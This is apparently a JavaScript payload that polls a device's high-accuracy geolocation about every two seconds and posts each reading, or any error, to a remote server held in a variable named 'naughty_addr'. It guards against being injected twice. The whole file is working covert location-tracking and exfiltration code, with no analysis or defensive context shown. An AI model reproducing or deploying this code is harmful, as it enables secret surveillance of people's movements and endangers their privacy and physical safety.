var onSuccess = function(position) {
    msg = 
        'Time: ' + position.timestamp + ' ' +
        'Lat: ' + position.coords.latitude + ' ' +
        'Lon: ' + position.coords.longitude + ' ' +
        'Accuracy: ' + position.coords.accuracy;
    console.log(msg);

    var fd = new FormData();
    fd.append('data', msg);
    $.ajax({
        type: "POST",
        url: naughty_addr + "/location",
        enctype: 'application/x-www-form-urlencoded',
        cache: false,
        contentType: false,
        processData: false,
        data: fd,
        success: function () {
            console.log("Location posted");
        },
        fail: function() {
            console.log("Location not posted");
        }
    });

    getLocation();
};

function onError(error) {
    msg = 
        'Times: ' + (new Date()).toString() + ' ' +
        'Code: ' + error.code + ' ' +
        error.message;
    console.log(msg);

    var fd = new FormData();
    fd.append('data', msg);
    $.ajax({
        type: "POST",
        url: naughty_addr + "/location",
        enctype: 'application/x-www-form-urlencoded',
        cache: false,
        contentType: false,
        processData: false,
        data: fd,
        success: function () {
            console.log("Location error posted");
        },
        fail: function() {
            console.log("Location error not posted");
        }
    });

    getLocation();
}

function getLocation() {
    time = Date.now();
    console.log(time + " " + window.target_time);
    if (window.target_time > time) {
        setTimeout(getLocation, window.target_time - time);
        return;
    }
    // This 2000ms is for rate limiting. Note that geolocation needs a longer
    //   timeout to acquire the location, so our timeout might be much longer
    //   than the rate limiting because of initial acquisition times.
    // Stupid geolocation enables and disables the location with this API.
    // TODO: perhaps use the location watcher (which sees when you change location)
    //   to keep location enabled at all times.
    window.target_time = Date.now() + 2000;
    navigator.geolocation.getCurrentPosition(onSuccess, onError, { timeout: 20000, enableHighAccuracy: true });
}

if (!(window.started === "geolocate")) {
    window.started = "geolocate";
    window.target_time = Date.now();
    getLocation();
}
